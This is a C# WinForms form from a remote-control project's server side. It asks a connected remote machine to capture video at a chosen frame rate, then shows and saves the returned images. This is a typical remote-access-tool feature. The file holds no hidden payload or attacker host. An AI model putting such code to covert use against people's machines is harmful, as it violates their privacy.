﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using RemoteControl.Protocals;

namespace RemoteControl.Server
{
    public partial class FrmCaptureVideo : FrmBase
    {
        private SocketSession oSession;
        private bool saveInRealTime = false;
        private int _fps = 2;

        public FrmCaptureVideo(SocketSession session)
        {
            InitializeComponent();
            this.oSession = session;
        }

        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            ToolStripButton button = sender as ToolStripButton;
            button.Checked = !button.Checked;
            if (button.Checked)
            {
                this.toolStripSplitButton2.Enabled = false;
                RequestStartCaptureVideo req = new RequestStartCaptureVideo();
                req.Fps = _fps;
                oSession.Send(ePacketType.PACKET_START_CAPTURE_VIDEO_REQUEST, req);
            }
            else
            {
                this.toolStripSplitButton2.Enabled = true;
                oSession.Send(ePacketType.PACKET_STOP_CAPTURE_VIDEO_REQUEST, null);
            }
        }

        public void HandleScreen(ResponseStartCaptureVideo resp)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action<ResponseStartCaptureVideo>(HandleScreen), resp);
                return;
            }
            //MsgBox.ShowInfo(resp.ImageData.Length + "");
            this.pictureBox1.Image = resp.GetImage();
            this.toolStripStatusLabel1.Text = "图像采集时间：" + resp.CollectTime;
            this.toolStripStatusLabel2.Text = "图像返回时间：" + DateTime.Now;
            // 实时保存
            if (this.saveInRealTime)
            {
                try
                {
                    if (!System.IO.Directory.Exists("CaptureVideo"))
                    {
                        System.IO.Directory.CreateDirectory("CaptureVideo");
                    }
                    string filename = string.Format("\\CaptureVideo\\{0}_{1}.bmp", oSession.SocketId, resp.CollectTime.ToString("yyyyMMddHHmmssfff"));
                    System.IO.File.WriteAllBytes(filename, resp.ImageData);
                }
                catch (Exception ex)
                {
                    
                }
            }
        }

        private void FrmCaptureScreen_Load(object sender, EventArgs e)
        {
            // Panel增加滚动条
            this.panel1.AutoScroll = true;
            // 根据图像大小，自动调节控件和Image的尺寸
            this.pictureBox1.SizeMode = PictureBoxSizeMode.AutoSize;
        }

        private void toolStripButtonSave_Click(object sender, EventArgs e)
        {
            
        }

        private void toolStripButtonSave_ButtonClick(object sender, EventArgs e)
        {
            if (this.pictureBox1.Image != null)
            {
                Image img = (Image)this.pictureBox1.Image.Clone();
                string fileName = "";
                SaveFileDialog dialog = new SaveFileDialog();
                if (dialog.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                {
                    fileName = dialog.FileName;
                    try
                    {
                        img.Save(fileName);
                        img.Dispose();
                        MsgBox.ShowInfo("保存成功!");
                    }
                    catch (Exception ex)
                    {
                        MsgBox.ShowInfo("保存失败，" + ex.Message);
                    }
                }
            }
            else
            {
                MsgBox.ShowInfo("暂无图像，无法保存！");
            }
        }

        private void 实时保存ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.saveInRealTime = !this.saveInRealTime;
            this.实时保存ToolStripMenuItem.Checked = !this.实时保存ToolStripMenuItem.Checked;
        }

        /// <summary>
        /// 不同的帧率的点击事件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripMenuItemFPS_Click(object sender, EventArgs e)
        {
            ToolStripMenuItem item = sender as ToolStripMenuItem;
            if (item != null && item.Tag != null)
            {
                var parent = this.toolStripSplitButton2;
                for (int i = 0; i < parent.DropDownItems.Count; i++)
                {
                    var mItem = parent.DropDownItems[i] as ToolStripMenuItem;
                    if (mItem != null)
                    {
                        mItem.Checked = false;
                    }
                }

                _fps = Convert.ToInt32(item.Tag);
                item.Checked = true;
            }
        }
    }
}
